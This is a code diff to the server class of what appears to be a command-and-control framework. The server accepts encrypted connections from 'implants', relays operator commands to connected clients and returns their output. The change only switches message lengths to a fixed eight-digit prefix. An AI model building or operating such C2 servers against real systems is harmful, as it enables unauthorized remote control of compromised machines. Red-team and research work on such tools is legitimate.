@@ -43,6 +43,7 @@ class MyServer():
     def decrypt_msg(self, encrypted_msg, full_key):
         aes = ecdh.C2_AES(full_key)
         return aes.decrypt(encrypted_msg)
+    
     #function for handling Connections
     def lp_handle_connection(self, connection):
         implant_info = connection[0].recv(1024)
@@ -65,20 +66,17 @@ class MyServer():
             data = self.decrypt_msg(data, aes_key)
             if data.decode() == "get_clients":
                 msg = self.encrypt_msg(json.dumps(self.lp_connections), aes_key)
-                connection[0].send(str(len(msg)).encode())
-                connection[0].send(msg)
+                connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
             else:
                 data = json.loads(data.decode())
                 if 'command' in data:
                     msg = self.encrypt_msg(data["command"],self.client_sockets[int(data['client_id'])][1])
-                    self.client_sockets[int(data['client_id'])][0].send(str(len(msg)).encode())
-                    self.client_sockets[int(data['client_id'])][0].send(msg)
+                    self.client_sockets[int(data['client_id'])][0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
                     response_len = self.client_sockets[int(data['client_id'])][0].recv(8)
                     response = self.client_sockets[int(data['client_id'])][0].recv(int(response_len.decode()))
                     response = self.decrypt_msg(response, self.client_sockets[int(data['client_id'])][1])
                     msg = self.encrypt_msg(response.decode(), aes_key)
-                    connection[0].send(str(len(msg)).encode())
-                    connection[0].send(msg)
+                    connection[0].send(("0"*(8 - len(str(len(msg))))+str(len(msg))).encode() + msg)
     #function to bind socket to port
     def bind(self, sock, host, port):
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -89,6 +87,7 @@ class MyServer():
             self.console.log(f"Unable to bind to {host}:{port}")
             self.console.log("Exiting...")
             return False
+    
     #function to start listening
     def lp_listen(self, sock):
         try:
@@ -104,6 +103,7 @@ class MyServer():
             thread = threading.Thread(target=self.lp_handle_connection, args=[(conn, addr)])
             thread.deamon = True
             thread.start()
+    
     def command_listen(self, sock):
         try:
             sock.listen(10)
@@ -119,6 +119,7 @@ class MyServer():
             thread = threading.Thread(target=self.command_handle_connection, args=[(conn, addr)])
             thread.deamon = True
             thread.start()
+    
     #function to start the server
     def start(self):
         #start LP
